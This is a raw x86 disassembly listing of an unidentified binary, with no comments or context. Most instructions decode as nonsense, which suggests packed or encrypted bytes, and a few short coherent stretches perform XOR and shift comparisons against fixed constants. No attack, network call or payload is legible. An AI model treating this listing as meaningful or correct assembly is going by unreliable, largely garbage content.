  407caa:	mov    al,ds:0x858fafce
  407caf:	xchg   BYTE PTR [ecx+esi*2-0x372049e2],dl
  407cb6:	jne    0x407c64
  407cb8:	dec    ebp
  407cb9:	sub    ecx,DWORD PTR [esi]
  407cbb:	je     0x407c69
  407cbd:	stos   BYTE PTR es:[edi],al
  407cbe:	fs aam 0xdf
  407cc1:	add    DWORD PTR [ebp+ebx*1+0x68],esp
  407cc5:	mov    eax,ds:0xa4c65a8c
  407cca:	ret    0xc9f4
  407ccd:	call   FWORD PTR [edx-0x518760ba]
  407cd3:	fnsave [esi-0x52]
  407cd6:	pop    eax
  407cd7:	into   
  407cd8:	or     ebp,DWORD PTR [edi+0x75]
  407cdb:	mov    gs,WORD PTR [ecx-0x40]
  407cde:	push   cs
  407cdf:	mov    ebp,0x755d8803
  407ce4:	sub    bl,ah
  407ce6:	add    cl,BYTE PTR [esi+0x566e5690]
  407cec:	xor    al,0xac
  407cee:	cmp    eax,DWORD PTR [edi-0x7de4fcc7]
  407cf4:	add    BYTE PTR [esi],cl
  407cf6:	ffreep st(0)
  407cf8:	js     0x407d58
  407cfa:	cmp    BYTE PTR [edi+ebx*1-0x3a82c23b],cl
  407d01:	add    ebp,ebx
  407d03:	scas   eax,DWORD PTR es:[edi]
  407d04:	jmp    FWORD PTR [ebx+eiz*2-0x4475aaa6]
  407d0b:	adc    ebp,DWORD PTR [ebx]
  407d0d:	push   edx
  407d0e:	dec    eax
  407d0f:	inc    ecx
  407d10:	cdq    
  407d11:	sbb    DWORD PTR [edx+0x76],0xffffffe3
  407d15:	pop    esi
  407d16:	fisubr WORD PTR [edx-0x620ad164]
  407d1c:	aam    0x47
  407d1e:	add    BYTE PTR [eax],ah
  407d20:	cmp    al,0x8f
  407d22:	(bad)  [eax]
  407d24:	dec    ecx
  407d25:	fcom   QWORD PTR [ecx+0xd]
  407d28:	mov    esi,0xa15cd219
  407d2d:	into   
  407d2e:	(bad)  
  407d2f:	adc    al,0x92
  407d31:	pushf  
  407d32:	jl     0x407cb8
  407d34:	and    al,0xf3
  407d36:	jno    0x407d20
  407d38:	cdq    
  407d39:	ret    
  407d3a:	and    dh,0xfc
  407d3d:	retf   
  407d3e:	xchg   esp,eax
  407d3f:	push   ds
  407d40:	sahf   
  407d41:	cmp    eax,0x37b302aa
  407d46:	adc    cl,dl
  407d48:	push   esi
  407d49:	jbe    0x407d3e
  407d4b:	inc    ebx
  407d4c:	push   ecx
  407d4d:	jno    0x407dcb
  407d4f:	sub    ch,BYTE PTR [eax-0x26ebd7b8]
  407d55:	shl    ebx,1
  407d57:	xchg   BYTE PTR [esi],bh
  407d59:	sbb    BYTE PTR [edx-0x354406a3],bl
  407d5f:	mov    WORD PTR [ecx-0x6de99ac8],fs
  407d65:	dec    ebx
  407d66:	or     eax,0xc2495026
  407d6b:	jnp    0x407daa
  407d6d:	imul   ecx,DWORD PTR [eax],0xffffff9d
  407d70:	leave  
  407d71:	pop    ecx
  407d72:	mov    ch,0xc2
  407d74:	mov    WORD PTR [edx-0x4e],fs
  407d77:	ret    
  407d78:	push   cs
  407d79:	or     dh,cl
  407d7b:	cli    
  407d7c:	xor    DWORD PTR [eax+ebp*4+0x4262a504],esp
  407d83:	je     0x407d07
  407d85:	lods   al,BYTE PTR ds:[esi]
  407d86:	enter  0xca13,0x4b
  407d8a:	push   ecx
  407d8b:	jno    0x407de6
  407d8d:	adc    esp,ebx
  407d8f:	adc    BYTE PTR [ecx+0x64773602],dl
  407d95:	cmp    cl,BYTE PTR [esi-0x38]
  407d98:	or     BYTE PTR [eax],ch
  407d9a:	xchg   ebp,eax
  407d9b:	sbb    ecx,eax
  407d9d:	lock adc ebx,DWORD PTR [esi-0x1e036733]
  407da4:	mov    al,ds:0x65bf61de
  407da9:	mov    ds:0x6ecc9fb2,al
  407dae:	sbb    esp,ebp
  407db0:	adc    eax,0x3931dcc2
  407db5:	pop    esp
  407db6:	xlat   BYTE PTR ds:[ebx]
  407db7:	pop    ebx
  407db8:	and    dl,BYTE PTR [esi]
  407dba:	push   0xc6dee4ad
  407dbf:	xchg   edi,eax
  407dc0:	mov    eax,ecx
  407dc2:	mov    ecx,DWORD PTR [ebp-0x34]
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0x2be9517e
  407e7d:	mov    esi,0x18186f22
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [ecx-0xb099be6],ah
  407e8b:	pslld  mm7,QWORD PTR ds:0xe56b1bef
  407e92:	or     eax,0x7e97e6bd
  407e97:	leave  
  407e98:	ror    edx,cl
  407e9a:	bound  ebx,QWORD PTR [eax+0x329a66c8]
  407ea0:	out    dx,al
  407ea1:	fmul   DWORD PTR [ebp+0x66]
  407ea4:	jle    0x407e6d
  407ea6:	dec    eax
  407ea7:	mov    eax,ds:0xe886eae4
  407eac:	adc    al,0x8f
  407eae:	jbe    0x407ef8
  407eb0:	cli    
  407eb1:	jecxz  0x407ecb
  407eb3:	dec    BYTE PTR [ebx+0x75e6940b]
  407eb9:	(bad)  
  407ebb:	adc    dh,BYTE PTR [edi+0x4abbd8ec]
  407ec1:	sub    al,0x2c
  407ec3:	mov    dl,0xf8
  407ec5:	lods   eax,DWORD PTR ds:[esi]
  407ec6:	aas    
  407ec7:	mov    bh,BYTE PTR [eax]
  407ec9:	hlt    
  407eca:	xchg   ecx,eax
  407ecb:	stc    
  407ecc:	push   edx
  407ecd:	xlat   BYTE PTR ds:[ebx]
  407ece:	add    eax,0x2e4ff79d
  407ed3:	mov    esp,0xef7773
  407ed8:	out    0x1e,al
  407eda:	dec    esp
  407edb:	adc    BYTE PTR [eax],al
  407edd:	pop    esi
  407ede:	push   ss
  407edf:	imul   edx,DWORD PTR es:[edi-0x9],0xfffffff9
  407ee4:	hlt    
  407ee5:	mov    WORD PTR [esi+edi*4+0x724fdb77],cs
  407eec:	call   0xe8507e4a
  407ef1:	sub    cl,BYTE PTR [eax]
  407ef3:	imul   esi,DWORD PTR [esi+0x1aad9e88],0x7
  407efa:	push   es
  407efb:	inc    esi
  407efc:	int    0xd8
  407efe:	dec    ebx
  407eff:	ins    DWORD PTR es:[edi],dx
  407f00:	cli    
  407f01:	scas   eax,DWORD PTR es:[edi]
  407f02:	pusha  
  407f03:	fcmove st,st(5)
  407f05:	sbb    eax,0xa44507e9
  407f0a:	daa    
  407f0b:	xchg   esp,ecx
  407f0d:	in     eax,0x48
  407f0f:	or     BYTE PTR [ebp-0x6a],al
  407f12:	mov    edi,0x2189b34c
  407f17:	inc    esi
  407f18:	dec    eax
  407f19:	xor    bh,BYTE PTR [esi+0x5e]
  407f1c:	mov    al,BYTE PTR [ebp-0x465e92b9]
  407f22:	mov    DWORD PTR [edx+0x71],ebp
  407f25:	pop    eax
  407f26:	sti    
  407f27:	pop    edx
  407f28:	pop    ebp
  407f29:	neg    BYTE PTR [edx-0x4e]
  407f2c:	inc    ecx
  407f2d:	fcmovu st,st(7)
  407f2f:	fstp   TBYTE PTR [ebx+0xbcfca6a]
  407f35:	push   es
  407f36:	sub    cl,cl
  407f38:	mov    WORD PTR ds:0xa21c96e3,es
  407f3e:	jne    0x407f94
  407f40:	inc    edx
  407f41:	pop    esi
  407f42:	lea    ebx,[edi+0x78a13d17]
  407f48:	mov    bh,0x11
  407f4a:	outs   dx,DWORD PTR ds:[esi]
  407f4b:	adc    bh,BYTE PTR [eax-0x6a6d7e62]
  407f51:	popa   
  407f52:	loopne 0x407fc8
  407f54:	xor    ecx,edx
  407f56:	cmc    
  407f57:	pop    edx
  407f58:	stc    
  407f59:	scas   eax,DWORD PTR es:[edi]
  407f5a:	push   esp
  407f5b:	xchg   BYTE PTR [edi+0x2f],cl
  407f5e:	test   DWORD PTR [ebx-0x9d75608],esp
  407f64:	aam    0x3d
  407f66:	lahf   
  407f67:	xor    DWORD PTR [ebx],ecx
  407f69:	lea    ebp,[eax-0x150889e8]
  407f6f:	dec    ebx
  407f70:	mov    ch,0xd5
  407f72:	or     al,0x8d
  407f74:	test   ebx,eax
  407f76:	stos   BYTE PTR es:[edi],al
  407f77:	iret   
  407f78:	pop    edi
  407f79:	sub    BYTE PTR [edx+0x15e56016],dl
  407f7f:	sub    ebx,DWORD PTR [esi]
  407f81:	pavgb  xmm5,XMMWORD PTR ds:0xc282679f
  407f89:	cmc    
  407f8a:	ret    0x9b70
  407f8d:	or     bh,ah
  407f8f:	sahf   
  407f90:	add    ch,BYTE PTR [ebp+0x1f]
  407f93:	mov    bl,0xc8
  407f95:	pushf  
  407f96:	sbb    DWORD PTR [esi+0x62702df5],ecx
  407f9c:	adc    al,0x59
  407f9e:	mov    cl,dh
  407fa0:	jmp    0x407fd7
  407fa2:	pop    esi
  407fa3:	xchg   BYTE PTR [ebx-0x59b74856],bl
  407fa9:	cmp    cl,BYTE PTR [ebx-0xe2b6cc0]
  407faf:	lock in al,dx
  407fb1:	jp     0x407fd9
  407fb3:	mov    esp,0x9c56cb6d
  407fb8:	mov    ah,0xcf
  407fba:	adc    eax,0xf9e53ce8
  407fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fc0:	mov    ebp,0xcafb2403
  407fc5:	fs cwde 
  407fc7:	fild   WORD PTR [ebx-0x2510cd3d]
  407fcd:	mov    eax,0x644ea286
  407fd2:	test   cl,ch
  407fd4:	aam    0xfd
  407fd6:	lahf   
  407fd7:	jne    0x407fae
  407fd9:	sbb    al,0x35
  407fdb:	adc    ecx,DWORD PTR [ebx-0x69]
  407fde:	daa    
  407fdf:	mov    dl,0x58
  407fe1:	outs   dx,BYTE PTR ds:[esi]
  407fe2:	jo     0x407fcc
  407fe4:	fsubr  st,st(1)
  407fe6:	int    0x44
  407fe8:	sar    DWORD PTR ds:0x977735f9,0x2
  407fef:	adc    bh,al
  407ff1:	fisub  WORD PTR [edi]
  407ff3:	ins    DWORD PTR es:[edi],dx
  407ff4:	adc    eax,0x90637ddf
  407ff9:	scas   al,BYTE PTR es:[edi]
  407ffa:	push   0x9cec7477
  407fff:	cmp    BYTE PTR [edi],dh
  408001:	and    esp,edx
  408003:	test   al,0x3a
  408005:	imul   esi,DWORD PTR [esi-0x72],0x36
  408009:	test   eax,0xc642583b
  40800e:	out    dx,eax
  40800f:	mov    al,ds:0xdc186e26
  408014:	xlat   BYTE PTR ds:[ebx]
  408015:	pop    edx
  408016:	mov    DWORD PTR [esi],ebp
  408018:	dec    ecx
  408019:	mov    ecx,0x22f66ec
  40801e:	or     al,0x86
  408020:	jle    0x408085
  408022:	jae    0x40802b
  408024:	xchg   esp,eax
  408025:	sub    DWORD PTR [ecx+0x58c7a423],edx
  40802b:	lds    ecx,FWORD PTR [esi]
  40802d:	fwait
  40802e:	jo     0x4080a5
  408030:	inc    ebx
  408031:	push   ebx
  408032:	int3   
  408033:	mov    dl,0x38
  408035:	fdiv   QWORD PTR [edx+0x4c]
  408038:	and    BYTE PTR ds:[edi+eax*8],al
  40803c:	inc    edi
  40803d:	mov    WORD PTR [edi],gs
  40803f:	pop    es
  408040:	clc    
  408041:	aas    
  408042:	cwde   
  408043:	sub    ebp,DWORD PTR [edi+0x7c]
  408046:	das    
  408047:	xchg   edi,eax
  408048:	mov    edx,0xd3d1ab24
  40804d:	adc    edx,edx
  40804f:	arpl   WORD PTR [eax+0x4e],ax
  408052:	cdq    
  408053:	fidiv  DWORD PTR [ebx]
  408055:	enter  0x9ace,0xea
  408059:	sti    
  40805a:	push   esp
  40805b:	shr    ecx,cl
  40805d:	jmp    0x408075
  40805f:	inc    ebx
  408060:	test   eax,0x9d57554f
  408065:	mov    ds:0x2845f737,eax
  40806a:	mov    cl,0x51
  40806c:	mov    bl,0x38
  40806e:	sti    
  40806f:	std    
  408070:	stos   DWORD PTR es:[edi],eax
  408071:	nop
  408072:	in     eax,dx
  408073:	or     esp,DWORD PTR [edx+0x2306ae6f]
  408079:	xlat   BYTE PTR ds:[ebx]
  40807a:	mov    ch,0x63
  40807c:	loopne 0x4080ca
  40807e:	and    cl,al
  408080:	sahf   
  408081:	xor    BYTE PTR [ecx+0x3c7062b5],0xd8
  408088:	shl    ecx,cl
  40808a:	mov    cl,0x42
  40808c:	xor    edx,DWORD PTR [edx-0x1]
  40808f:	inc    esp
  408090:	sub    DWORD PTR [eax-0x2e3755aa],edx
  408096:	test   BYTE PTR [ecx+0x20],dl
  408099:	enter  0x3435,0xd1
  40809d:	xor    ecx,DWORD PTR [ecx]
  40809f:	sub    al,0xf6
  4080a1:	out    0x62,al
  4080a3:	push   ebx
  4080a4:	mov    eax,ds:0x61f31d16
  4080a9:	lods   eax,DWORD PTR ds:[esi]
  4080aa:	dec    edi
  4080ab:	loopne 0x40810e
  4080ad:	add    al,0x20
  4080af:	fcomp  DWORD PTR [ebp+0x739258d]
  4080b5:	out    0x23,eax
  4080b7:	les    edx,FWORD PTR [ecx]
  4080b9:	fs hlt 
  4080bb:	pop    esp
  4080bc:	out    0x84,eax
  4080be:	cmp    BYTE PTR [ecx+edx*4-0x22b3f6f5],al
  4080c5:	jmp    0x40806b
  4080c7:	pop    ss
  4080c8:	push   ecx
  4080c9:	xor    esp,DWORD PTR [edx-0x7a82120a]
  4080cf:	ret    0xb1c6
  4080d2:	mov    bh,0x7b
  4080d4:	jne    0x40813f
  4080d6:	xchg   DWORD PTR [edx],edx
  4080d8:	dec    esi
  4080d9:	jnp    0x4080b1
  4080db:	clc    
  4080dc:	inc    eax
  4080dd:	outs   dx,DWORD PTR ds:[esi]
  4080de:	gs pop edi
  4080e0:	xchg   DWORD PTR [eax+0x569a1679],ecx
  4080e6:	pop    esi
  4080e7:	imul   edi,DWORD PTR [ecx],0xdc73b7ba
  4080ed:	sbb    ah,BYTE PTR [esp+eax*2+0x8]
  4080f1:	imul   ebx,DWORD PTR [edi-0x387fab28],0xffffffe5
  4080f8:	(bad)  
  4080f9:	and    edi,DWORD PTR [ecx-0x352501e3]
  4080ff:	xchg   ebx,eax
  408100:	or     BYTE PTR [edi],cl
  408102:	xor    al,0xef
  408104:	sub    ah,BYTE PTR [ecx+0x69c21c0c]
  40810a:	adc    al,0x75
  40810c:	and    ah,BYTE PTR [ebx+ebx*4+0x3655fd97]
  408113:	ja     0x40814e
  408115:	lahf   
  408116:	or     esi,eax
  408118:	dec    ecx
  408119:	into   
  40811a:	mov    ds:0x4438ae9f,al
  40811f:	mov    ch,0x8
  408121:	push   ecx
  408122:	ins    DWORD PTR es:[edi],dx
  408123:	sbb    ebp,DWORD PTR [ebx+0x33c40e7c]
  408129:	femms  
  40812b:	dec    esi
  40812c:	add    esp,DWORD PTR [edi]
  40812e:	jg     0x4080f0
  408130:	jbe    0x408197
  408132:	xor    al,bl
  408134:	adc    BYTE PTR [ecx],dh
  408136:	rol    DWORD PTR [eax+edi*1],0x6d
  40813a:	das    
  40813b:	xor    esi,DWORD PTR [eax]
  40813d:	lds    esp,FWORD PTR [esi+0x5b31cb0e]
  408143:	jne    0x4081a6
  408145:	inc    ecx
  408146:	fcom   QWORD PTR [edi]
  408148:	test   DWORD PTR [ecx],esp
  40814a:	sbb    eax,0xbf60c178
  40814f:	jg     0x408131
  408151:	out    dx,al
  408152:	push   ebp
  408153:	dec    edx
  408154:	jecxz  0x40811c
  408156:	xor    dh,ch
  408158:	neg    BYTE PTR [ebp+0x3766ba00]
  40815e:	je     0x4081b7
  408160:	(bad)  
  408161:	in     eax,0xe6
  408163:	sahf   
  408164:	fisttp QWORD PTR [ecx-0x663e0dc2]
  40816a:	(bad)  
  40816b:	jo     0x40811c
  40816d:	(bad)  
  40816e:	mov    esp,0xc4830ddb
  408173:	jae    0x4081dd
  408175:	inc    eax
  408176:	or     al,0xa9
  408178:	and    DWORD PTR [esi],0x916367cf
  40817e:	xor    DWORD PTR [edx-0x37],eax
  408181:	scas   al,BYTE PTR es:[edi]
  408182:	(bad)  
  408184:	call   FWORD PTR [ecx]
  408186:	jmp    0x1f05:0x2d18a77c
  40818d:	leave  
  40818e:	retf   0x3512
  408191:	and    eax,DWORD PTR [edx+ebp*1+0x61]
  408195:	cmp    eax,0x31a032ca
  40819a:	(bad)  
  40819c:	out    0xdd,eax
  40819e:	dec    eax
  40819f:	in     al,dx
  4081a0:	cdq    
  4081a1:	(bad)
  4081a5:	mov    bl,0x5c
  4081a7:	clc    
  4081a8:	std    
  4081a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081aa:	sbb    BYTE PTR [esi+0x472be5fd],bl
  4081b0:	or     DWORD PTR [ebx-0x27],0xa
  4081b4:	loope  0x4081a1
  4081b6:	jo     0x40819f
  4081b8:	mov    bl,0xe
  4081ba:	pop    ebp
  4081bb:	push   eax
  4081bc:	push   edx
  4081bd:	neg    BYTE PTR [edx-0x10c7b147]
  4081c3:	jno    0x408213
  4081c5:	sub    al,0xfb
  4081c7:	xor    eax,0xae02f78a
  4081cc:	(bad)  
  4081cd:	je     0x40821a
  4081cf:	xor    DWORD PTR [edi+0x1f],esp
  4081d2:	mov    dh,0xeb
  4081d4:	lds    eax,FWORD PTR [esp+edi*8]
  4081d7:	shr    BYTE PTR [eax-0xf],1
  4081da:	fld    QWORD PTR [ecx+0x6b9f11fc]
  4081e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081e1:	jnp    0x4081d7
  4081e3:	retf   0xfb60
  4081e6:	test   al,0xe5
  4081e8:	daa    
  4081e9:	ss inc ebp
  4081eb:	(bad)  
  4081ec:	push   ds
  4081ed:	daa    
  4081ee:	sub    BYTE PTR [edi+0x797dc928],bh
  4081f4:	mov    eax,0x32d1d61c
  4081f9:	add    DWORD PTR [esi+ebx*8+0x1e45a796],ebx
  408200:	pop    ebx
  408201:	mov    ebx,0x180c8b89
  408206:	cmp    al,0xe9
  408208:	inc    ebp
  408209:	pop    ebp
  40820a:	jo     0x40826a
  40820c:	inc    ebp
  40820d:	sbb    BYTE PTR [edi],ah
  40820f:	push   ds
  408210:	cmp    DWORD PTR [ecx+0x3],edi
  408213:	sbb    al,ch
  408215:	daa    
  408216:	mov    ecx,0xbd9f1c62
  40821b:	(bad)
  40821e:	adc    al,0x38
  408220:	std    
  408221:	daa    
  408222:	in     al,0x84
  408224:	adc    DWORD PTR [esp+edx*2+0x33],eax
  408228:	xchg   ebp,eax
  408229:	mov    eax,0x9da2df6
  40822e:	mov    DWORD PTR [eax],edi
  408230:	dec    eax
  408231:	inc    esi
  408232:	xchg   esp,eax
  408233:	(bad)  
  408235:	fild   QWORD PTR [edx+0x59]
  408238:	in     al,dx
  408239:	arpl   WORD PTR [ebx],si
  40823b:	lods   al,BYTE PTR ds:[esi]
  40823c:	(bad)  
  40823d:	icebp  
  40823e:	(bad)
  408241:	or     al,0x5e
  408243:	out    dx,al
  408244:	cmp    DWORD PTR ds:0x94458961,eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0x889f709d
  40828a:	clc    
  40828b:	push   0xffffffa8
  40828d:	sbb    BYTE PTR [bx+si],bl
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    BYTE PTR [edi-0x64],ah
  408296:	(bad)
  40829a:	outs   dx,DWORD PTR ds:[esi]
  40829b:	sti    
  40829c:	not    DWORD PTR [eax-0xd1141f0]
  4082a2:	push   cs
  4082a3:	pop    esp
  4082a4:	rcl    BYTE PTR [esi+0x42],cl
  4082a7:	imul   eax,DWORD PTR [esi+0xe],0xdff2586a
  4082ae:	popf   
  4082af:	cmp    BYTE PTR [eax+0x470f6560],0xd
  4082b6:	xor    al,0x89
  4082b8:	xchg   esi,eax
  4082b9:	mov    cl,0x7f
  4082bb:	add    BYTE PTR [ecx+0x496f967b],bl
  4082c1:	mov    esi,0x3d5f9d1e
  4082c6:	xchg   DWORD PTR [ebx+0x4d],ebp
  4082c9:	lock push ds
  4082cb:	jmp    0xd0c5fa01
  4082d0:	push   cs
  4082d1:	in     al,dx
  4082d2:	or     ebx,ebp
  4082d4:	add    eax,0xa36bc474
  4082d9:	stos   BYTE PTR es:[edi],al
  4082da:	mov    edx,0xb7c87cfc
  4082df:	jnp    0x4082c3
  4082e1:	pop    es
  4082e2:	push   cs
  4082e3:	cwde   
  4082e4:	pop    edx
  4082e5:	pop    ds
  4082e6:	int3   
  4082e7:	mov    ch,0x13
  4082e9:	mov    bl,BYTE PTR [esp+eiz*2+0x2468b85a]
  4082f0:	mov    cr1,ebp
  4082f3:	inc    esi
  4082f4:	jne    0x4082b3
  4082f6:	mov    bl,0x1f
  4082f8:	fistp  DWORD PTR [ebp+0x3b399af8]
  4082fe:	sub    DWORD PTR [eax+0x5f],esp
  408301:	or     DWORD PTR [edi-0x5b],edi
  408304:	test   eax,0x79f91acf
  408309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40830a:	rcr    BYTE PTR [esi],cl
  40830c:	jle    0x4082db
  40830e:	sar    DWORD PTR [ecx],1
  408310:	in     al,dx
  408311:	pop    esi
  408312:	xchg   edi,eax
  408313:	mov    ah,0x10
  408315:	(bad)  
  408317:	sbb    ah,ah
  408319:	(bad)  
  40831a:	push   edi
  40831b:	mov    dl,0x5
  40831d:	adc    al,0x65
  40831f:	xor    eax,0x88e3b7a4
  408324:	or     al,0x24
  408326:	idiv   BYTE PTR [esi+0x7d]
  408329:	fsub   st(3),st
  40832b:	call   0xb780c607
  408330:	push   ebx
  408331:	ds inc esi
  408333:	popf   
  408334:	mov    ds:0xea61a2e3,al
  408339:	mov    al,ds:0x8912170f
  40833e:	mov    es,esp
  408340:	out    dx,al
  408341:	add    BYTE PTR [eax],bh
  408343:	inc    ebp
  408344:	jo     0x408334
  408346:	push   es
  408347:	mov    esp,fs
  408349:	mov    DWORD PTR [edi],edi
  40834b:	push   0x18a95beb
  408350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408351:	das    
  408352:	sub    al,0xb8
  408354:	cmp    al,0xbc
  408356:	std    
  408357:	xchg   BYTE PTR [ebx+0x21],bl
  40835a:	es dec edi
  40835c:	xchg   ebx,eax
  40835d:	adc    ecx,DWORD PTR [edi-0x1b]
  408360:	loope  0x4083d1
  408362:	jmp    0x93e7:0xcbadae2e
  408369:	and    al,0xfe
  40836b:	dec    edx
  40836c:	clc    
  40836d:	xor    DWORD PTR [ebx],0x62
  408370:	or     al,0xae
  408372:	gs aad 0xa7
  408375:	sub    BYTE PTR [ebx],al
  408377:	and    BYTE PTR [edi],ah
  408379:	push   esp
  40837a:	pop    ebp
  40837b:	or     al,0x28
  40837d:	xchg   esi,eax
  40837e:	push   0xffffff8d
  408380:	inc    ecx
  408381:	pop    es
  408382:	push   es
  408383:	ret    
  408384:	xchg   edx,eax
  408385:	jp     0x4083c1
  408387:	mov    dh,BYTE PTR [ecx+0x1c9b3c3b]
  40838d:	or     al,0xb2
  40838f:	(bad)  
  408390:	ret    0x20c1
  408393:	and    BYTE PTR [edi-0x54aea0ce],bl
  408399:	add    al,0xf6
  40839b:	pop    ss
  40839c:	cmp    eax,0x88da0075
  4083a1:	mov    BYTE PTR [ebx-0x68],cl
  4083a4:	mov    dl,0xfa
  4083a6:	mov    ds:0x510a5a16,eax
  4083ab:	rcr    cl,1
  4083ad:	paddsw mm2,QWORD PTR [eax+0x5a7725ab]
  4083b4:	in     eax,dx
  4083b5:	js     0x4083bc
  4083b7:	lea    esi,[edi]
  4083b9:	cmp    al,0xda
  4083bb:	sub    esi,edx
  4083bd:	or     dh,dl
  4083bf:	push   ss
  4083c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083c1:	cli    
  4083c2:	(bad)  
  4083c3:	xchg   esi,eax
  4083c4:	outs   dx,BYTE PTR ds:[esi]
  4083c5:	pop    esp
  4083c6:	mov    dl,0xa5
  4083c8:	mov    ds:0x3ecd8097,eax
  4083cd:	sub    al,0xdd
  4083cf:	mov    ds:0xc7874acc,al
  4083d4:	retf   0x1fb6
  4083d7:	cmp    ah,BYTE PTR [ebp-0x52]
  4083da:	push   edi
  4083db:	test   edi,ecx
  4083dd:	(bad)  
  4083de:	pop    ecx
  4083df:	leave  
  4083e0:	cwde   
  4083e1:	xor    al,0x0
  4083e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083e5:	sub    al,0x1
  4083e7:	sti    
  4083e8:	loope  0x4083b9
  4083ea:	ja     0x4083cb
  4083ec:	xchg   edx,eax
  4083ed:	stc    
  4083ee:	cmc    
  4083ef:	hlt    
  4083f0:	xor    eax,0x6feb42a0
  4083f5:	sub    al,0xd3
  4083f7:	mov    dl,0x5b
  4083f9:	std    
  4083fa:	pop    es
  4083fb:	imul   esi,DWORD PTR [esi],0xffffff87
  4083fe:	pop    ebp
  4083ff:	es popa 
  408401:	xor    eax,0x2e72f23e
  408406:	sahf   
  408407:	loop   0x408481
  408409:	out    dx,eax
  40840a:	xchg   esp,eax
  40840b:	jns    0x408417
  40840d:	ds push ds
  40840f:	aaa    
  408410:	hlt    
  408411:	and    al,BYTE PTR [eax+0x33]
  408414:	jmp    0xc21:0x969ca877
  40841b:	mov    al,0x32
  40841d:	mov    dh,BYTE PTR [ebx+0x657fcad2]
  408423:	xlat   BYTE PTR ds:[ebx]
  408424:	js     0x40846c
  408426:	cs std 
  408428:	pop    ebx
  408429:	mov    esi,0x5748eccb
  40842e:	pop    ds
  40842f:	fisub  DWORD PTR [edi+0x72e5ecd4]
  408435:	jge    0x4083ba
  408437:	lock xor al,0xb5
  40843a:	mov    eax,0xbde3d3e4
  40843f:	shl    BYTE PTR [ebp+ecx*2-0x79],cl
  408443:	mov    ecx,0x77bc288
  408448:	inc    eax
  408449:	das    
  40844a:	adc    bl,BYTE PTR [eax+0x48]
  40844d:	mul    DWORD PTR [eax]
  40844f:	lods   al,BYTE PTR ds:[esi]
  408450:	in     al,0x3d
  408452:	shl    BYTE PTR [eax-0x58],0xaf
  408456:	push   esp
  408457:	cmp    dl,BYTE PTR [eax+eiz*4+0x7aeaabb6]
  40845e:	jecxz  0x40843a
  408460:	cmp    ebp,DWORD PTR [edi+eax*8]
  408463:	dec    ebx
  408464:	xor    BYTE PTR [edx],cl
  408466:	sub    al,BYTE PTR [ebx]
  408468:	out    dx,eax
  408469:	dec    esp
  40846a:	iret   
  40846b:	push   0x78d8c1cb
  408470:	push   ebx
  408471:	out    0xf2,eax
  408473:	call   0x96e3:0x1f06d2e1
